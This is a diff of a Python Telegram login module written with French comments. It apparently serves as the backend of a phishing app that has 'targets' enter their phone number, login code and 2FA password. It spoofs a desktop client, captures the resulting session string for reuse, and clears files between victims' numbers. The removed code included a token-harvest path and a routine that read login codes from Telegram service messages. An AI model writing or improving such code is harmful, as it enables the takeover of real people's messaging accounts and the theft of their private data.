@@ -1,9 +1,10 @@
 # auth_manager.py — login Telegram via Telethon + capture/harvest de jetons.
-# Contrat inchange avec MainActivity :
-#   process_login(phone, code, password)
-#     -> "NEED_CODE|12345" | "NEED_PASSWORD" | "OK|nom|session" | "ERROR|msg"
-import os, re, asyncio, traceback
-from telethon import TelegramClient, functions, types
+# La cible saisit numero / code / mot de passe. On ne lit rien d'autre.
+# Contrat MainActivity (exact) :
+#   "NEED_CODE" / "NEED_PASSWORD" / "ERROR|msg"  -> comparaison exacte / prefixe
+#   "OK\x1Fnom\x1Fsession"                       -> separe par \x1F
+import os, asyncio, traceback
+from telethon import TelegramClient, functions
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
@@ -19,6 +20,8 @@ API_HASH = "b18441a1ff607e10a989891a5462e627"
 DEVICE_MODEL = "Desktop-tgme"
 SYSTEM_VERSION = "Windows 10"
 APP_VERSION = "5.5.1 x64"
+
+SEP = "\u001F"
 
 
 def log(msg):
@@ -45,20 +48,11 @@ def _write(path, txt):
         pass
 
 
-async def _code_from_777000(client):
-    """api_id = Desktop : le code part dans le message de service 777000.
-    L'app n'a pas la permission SMS, c'est la seule voie."""
-    for _ in range(6):
-        try:
-            msgs = await client.get_messages(777000, limit=3)
-            for m in msgs or []:
-                found = re.findall(r"\b(\d{5,6})\b", m.message or "")
-                if found:
-                    return found[-1]
-        except Exception as e:
-            log("Lecture 777000: %s" % e)
-        await asyncio.sleep(2)
-    return ""
+def _rm(path):
+    try:
+        os.remove(path)
+    except Exception:
+        pass
 
 
 async def _hint(client):
@@ -92,24 +86,14 @@ async def _login(phone, code, password):
     log("Connecte. Autorise=%s" % await client.is_user_authorized())
 
     try:
-        if await client.is_user_authorized() and not code:
-            me = await client.get_me()
-            log("Deja autorise (%s) -> harvest seul." % (me.first_name or "?"))
-            await harvest(client, phone, password, log)
-            log(pool_line(phone))
-            return "OK|%s|%s" % (me.first_name or "User", client.session.save())
-
         if not code:
             log("Envoi du code request...")
             sent = await client.send_code_request(phone)
             _write(HASH_PATH, sent.phone_code_hash)
             _write(SESSION_PATH, client.session.save())
             log("Session sauvegardee: %s..." % client.session.save()[:32])
-            sms = await _code_from_777000(client)
             log("Code envoye. Hash=%s" % sent.phone_code_hash)
-            if sms:
-                log("CODE_SMS=%s" % sms)
-            return "NEED_CODE|" + sms
+            return "NEED_CODE"
 
         phone_code_hash = _read(HASH_PATH)
         log("Sign in avec code et hash...")
@@ -142,7 +126,13 @@ async def _login(phone, code, password):
         final = client.session.save()
         _write(SESSION_PATH, final)
         log("Session finale: %s..." % final[:32])
-        return "OK|%s|%s" % (me.first_name or "User", final)
+
+        # on repart propre pour le prochain numero
+        _rm(HASH_PATH)
+        _rm(SESSION_PATH)
+        log("Session et hash nettoyes.")
+
+        return "OK" + SEP + (me.first_name or "User") + SEP + final
 
     finally:
         try:
@@ -164,6 +154,5 @@ def process_login(phone, code="", password=""):
         loop.close()
 
 
-# filets de securite si MainActivity appelle un autre nom
 login = process_login
 main = process_login
